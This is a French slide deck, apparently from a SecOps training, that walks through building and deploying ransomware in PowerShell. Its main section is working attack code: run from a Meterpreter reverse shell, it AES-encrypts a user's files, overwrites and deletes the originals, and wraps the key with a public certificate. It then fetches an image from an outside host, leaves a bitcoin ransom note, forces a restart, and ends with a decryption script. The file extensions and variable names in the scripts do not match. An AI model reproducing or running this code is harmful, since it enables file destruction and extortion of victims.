## Ransomware

### YourLabs Business Service
### SecOps team

Note:
Un rançongiciel de l'anglais ransomware, logiciel de rançon ou logiciel
d'extorsion, est un logiciel malveillant qui prend en otage des données
personnelles.

Pour ce faire, un rançongiciel chiffre des données personnelles puis demande à
leur propriétaire d'envoyer de l'argent en échange de la clé qui permettra de
les déchiffrer.

Un ransomware peut aussi bloquer l'accès de tout utilisateur à une machine
jusqu'à ce qu'une clé ou un outil de débridage soit envoyé à la victime en
échange d'une somme d'argent. Les modèles modernes de rançongiciels sont
apparus en Russie initialement, mais on constate que le nombre d'attaques de ce
type a grandement augmenté dans d'autres pays, entre autres l'Australie,
l'Allemagne, les États-Unis.

---

# Loi Godfrain

Les dispositions de la loi Godfrain sont intégrées dans le Code pénal, livre
III (« Des crimes et délits contre les biens »), titre II (« Des autres
atteintes aux biens »), chap. III : « Des atteintes aux systèmes de traitement
automatisé de données ». Selon les infractions retenues, les peines peuvent
aller de 2 ans de prison et 30 000 euros d'amende à 10 ans d'emprisonnement et
150 000 euros d'amende (pour l'une quelconque de ces infractions commise en «
bande organisée » à l'encontre d'un STAD de l'État). Par ailleurs, ces peines
peuvent être accompagnées de privation de droits civiques et d'autres mesures
(interdiction de travailler dans la fonction publique, exclusion des marchés
publics, etc.).

Note:
La loi Godfrain du 5 janvier 1988, ou Loi no 88-19 du 5 janvier 1988 relative à
la fraude informatique, est la première loi française réprimant les actes de
criminalité informatique et de piratage. Nommée d'après le député RPR Jacques
Godfrain, c'est l'une des lois pionnières concernant le droit des NTIC, après,
notamment, la loi Informatique et libertés de 1978, qui introduit la notion de
système de traitement automatisé de données (STAD) et prévoit plusieurs
dispositions corrélatives de la loi Godfrain (notamment concernant les
obligations du responsable du traitement quant à la garantie de la sécurité des
données - art. 34 loi de 1978).

---

## Le plan

- chiffrement symétrique des fichiers avec une clef aleatoire |
- chiffrement asymétrique de la clef avec un certificat public |
- seul le détenteur du certificat privé dechiffrera la clef |
- tout faire en mémoire pour ne laisser aucune trace |

Note:
- On va chiffrer le fichier avec du chiffrement symmetrique et utiliser de
l'encryption asymmetrique pour encrypter la clée de cryptage...
- Seul ceui qui a le certificat privé poura decrypter la clé utilisée..
- Une encryption assymetrique pour tt encrypter prendrai trop de temps..

---

# Certificat

Note:
Un certificat électronique (aussi appelé certificat numérique ou certificat de clé publique) peut être vu comme une carte d'identité numérique. Il est utilisé principalement pour identifier et authentifier une personne physique ou morale, mais aussi pour chiffrer des échanges1.

Il s’agit également d’un concept très important pour tous ceux qui sont de véritables autorités en termes de sécurité informatique2.

Le standard le plus utilisé pour la création des certificats numériques est le X.509.

---

# Generation

```powershell
$cert = New-SelfSignedCertificate `
        -DnsName $YOUR_NAME `
        -CertStoreLocation "Cert:\CurrentUser\My" `
        -KeyLength 3072 `
        -HashAlgorithm "Sha384" `
        -NotBefore ((Get-Date).AddDays(-1)) `
        -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) `
        -Type DocumentEncryptionCert `
        -KeyUsage KeyEncipherment, DataEncipherment
```

---

# Export

```
> Export-Certificate -Cert $cert -FilePath "cert.cer" | Out-Null
```

---

# Texte

```
[Convert]::ToBase64String(
    [IO.File]::ReadAllBytes("/users/...../cert.cer")
)
```

Note:
base64 permet de chiffrer le certificat en texte afin de pouvoir le copier plus
facilement qu'en binaire

---

# Attaque

Sur reverse shell

```
meterpreter > shell
> powershell
> Add-Type -AssemblyName System.web
> $pwd = [system.web.security.membership]::GeneratePassword(32,15)
> $cert = "MIIECDCCAnCgAwIBAgIQFTufS/aikLxCOTgoWoLnyDANBgkqhkiG9w0BAQwFADARMQ8wDQYDVQQDDAZteWNlcnQwIBcNMTkxMTI5MTUyODQ3WhgPMjA5OTEyMzExNTI4NDhaMBExDzANBgNVBAMMBm15Y2VydDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAM/tJpom3ha8jKgtYzqoC2vIeJ/7xAHJ/B/q+FPS3ByhfsggnazOgMw+F6DIEnXG95wumlcF6e/M9gH2irUqwBIA0x2eDrGlH2k71ifE/iMe7TQBwe2uTDD0Vp3c6sFK6CMQOW3Ws30k2j+6E4KaUvdd52T5aYkYGCPj4MEe1noLy8t+GMDIT5bXw0TZluAGY6ExUVR8rN7AtsjBTcp9LWWw/5hlSZwDbMffYDdRlgm82QJedAYewyk6PwkjzcqsOdFV4Z8EmlIP2EM4Tnn6pHugJ3W5IIiRvNMVoPWiePBiThfR/npFnynqIDxJr973vdOjtCHBujTnU28nQfPqMb8E0lqlSeXskjZV176nuXB/1blvkNm0IYnJ/pm6i4p9mBjS0RoKlbPUg8iFcmtjjytQdjXDDtDpixyGcW/QfXyJFcfjl16A27QN3dNXEKYdhKhPSXM8zRedecpcvHl4t3iawW0EZlsFqzKlyjtr7zi5uj9nGHQajPBqNHrCXl6aJQIDAQABo1owWDAOBgNVHQ8BAf8EBAMCBDAwFAYDVR0lBA0wCwYJKwYBBAGCN1ABMBEGA1UdEQQKMAiCBm15Y2VydDAdBgNVHQ4EFgQUrwXEYlg0/q3ImayX6udhRvOTyt0wDQYJKoZIhvcNAQEMBQADggGBAHyM16X0efwFC2DwbbFT0RoFU9MLfEv1OrkaHFNPjn37p/53638o78dkBt28Hoi9LuGbN20dN7N0yu4W/cyFnuGjoz5zv2M9Tbipp+gO91jruxZmrXz6NSV/5jhAehZyP1MvVg1Nyub6n3WXkhekFQCmq0LORqBfgscwV2MNV1or2ThWCKRygrm3TgvuxPi5Wt40KrYTrp6VmVq39rXnfWJZD5oiCeIEI2OVf5BfFt1sgC4f2CQ2Ig/mjFrzzTtJWu5tNmJNknE8FIQN48LVsO7EFONXcx3VQ/WNO7Efo17BUCYl+CPNcYDMLWP/oKA/Hdbv4OTLcBbpiO0nNB1USn1YPASypVcXGC9y9Z6APBtrN4oVFY3yiuScXFjIm/fCWZN5IYpwIv3WuRG+p+X2ZE9Gw2GgeQCdpBXaS/YDix0oFHI3sRtmmUs0oKjbQEsEOgyOYnd65k5PK2Fcb/Rph0X+G97ErvOqlvhvfnvX0AosdCHnneYoBy0IcZYji2reAA=="

Function Encr{param([string]$i,[string]$p)
  process{
    [System.Security.Cryptography.AesCryptoServiceProvider]$a=[System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $a.BlockSize=128
    $a.KeySize=256
    $a.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $a.GenerateIV();[byte[]]$IV=$a.IV;[byte[]]$k=[system.Text.Encoding]::UTF8.GetBytes($pwd)
    [System.IO.FileStream]$fout=[System.IO.FileStream]::new($i+".MAD_666",[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$IC=$a.CreateEncryptor($k,$IV)
    [System.Security.Cryptography.CryptoStream]$CS=[System.Security.Cryptography.CryptoStream]::new($fout, $IC, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [System.IO.FileStream]$fin=[System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    $fout.Write($IV,0,$IV.Count)
    $DA=$true;[int]$D
    While ($DA){
      $D=$fin.ReadByte()
      if($D -ne -1){
        $CS.WriteByte([byte]$D)
      }
      else{
        $DA = $false
      }
    }
    $fin.Dispose();
    $CS.Dispose();
    $fout.Dispose()
  }
}

foreach ($i in $(Get-ChildItem /users/$env:USERNAME -recurse -include *.txt,*.jpg,*mp3 | ForEach-Object { $_.FullName })){
  Encr -i $i -p $pwd
  $size = [math]::round(((Get-Item $i)).length/4)+1
  $str = "hack" * $size
  echo $str > $i
  rm $i
}

> $cert =  [IO.File]::WriteAllBytes("/windows/temp/x.cer", [Convert]::FromBase64String($cert))

> echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt

> remove-variable pwd
```

@[1-2](Lancer powershell depuis notre session meterpreter)
@[3-4](Creer un mot de passe random)
@[5](Notre certificat public en base64)
@[7-34](Notre fonction de chiffrement)
@[36-42](Boucle pour chiffrer les fichiers)
@[44](On decode le certificat)
@[46](On encrypte la clée avec le certificat grace à `protect-cmsmessage`)
@[48](On supprime la variable pwd)

---

5) Message pour la victime

changer le wallpaper (facultatif):

```

> $img = 'http://xxx.xxx.Xxx/xxx.jpg'
# Pour changer le wallpaper

> Invoke-WebRequest -Uri $img -OutFile "/users/$env:USERNAME/img.jpg"
# On telecharge l'image

> Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value "/users/$env:USERNAME/img.jpg"
> rundll32.exe user32.dll, UpdatePerUserSystemParameters
# On change le wallaper
```

On ecrit un msg sur le bureau de la victime:

```

> $email = 'mon@email'
#l'email de l'attaquant, pour envoyer la clée chiffrer
> $btc = ''
# l'addresse btc pr le payment $$
echo "Send 0.1 btc to this account: $btc
After that, for the decryption keys and instructions for how to retrieve your files
send the content of the encrypted_keys and a proof of payment to this email: $email" > /users/$env:USERNAME/desktop/README.txt
```

6) On redemarre la machine de la victime (facultatif mais besoin pr le changement de wallpaper);

```
> restart-computer -force
```

---

##### La decrytion

1) La victime va envoyer la clée encrypter avec le certificat public, pour la decrypter:

```
# Sur la machine de l'attaquant
> Unprotect-CmsMessage -path .../encrypted_key.txt
```

2) On creer un script pour decrypter les fichiers infectés:

```
$pwd = ''
#Le password decrypté

function Decr{
  param([string]$i,[string]$p)
  process {
    $out = $i -replace ".{7}$"
    [System.IO.FStream]$FileStreamIn = [System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    [byte[]]$IV = New-Object byte[] 16; $FileStreamIn.Read($IV, 0, $IV.Length)
    [System.Security.Cryptography.AesCryptoServiceProvider]$Aes =  [System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $Aes.BlockSize = 128; $Aes.KeySize = 256; $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    [byte[]]$Key = [system.Text.Encoding]::UTF8.GetBytes($Password)
    [System.IO.FileStream]$FileStreamOut = [System.IO.FileStream]::new($out,[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$ICryptoTransform = $Aes.CreateDecryptor($Key,$IV)
    [System.Security.Cryptography.CryptoStream]$CryptoStream = [System.Security.Cryptography.CryptoStream]::new($FileStreamIn, $ICryptoTransform, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $DataAvailable = $true; [int]$Data
    While ($DataAvailable){
      $Data = $CryptoStream.ReadByte()
      if($Data -ne -1){
        $FileStreamOut.WriteByte([byte]$Data)
      }
      else{
        $DataAvailable = $false
      }
    }
    $FileStreamIn.Dispose()
    $CryptoStream.Dispose()
    $FileStreamOut.Dispose()
  }
}

# On loop et decrypte les fichiers avec l'extention ".LCK_666"
foreach ($i in $(Get-ChildItem /users/$env:USERNAME -recurse -include *.LCK_666 | ForEach-Object { $_.FullName })){
  Decr -i $i -p $pwd
  rm $i
}
```

On envoie par mail a la victime le script qu'il devra copier-coller dans powershell...
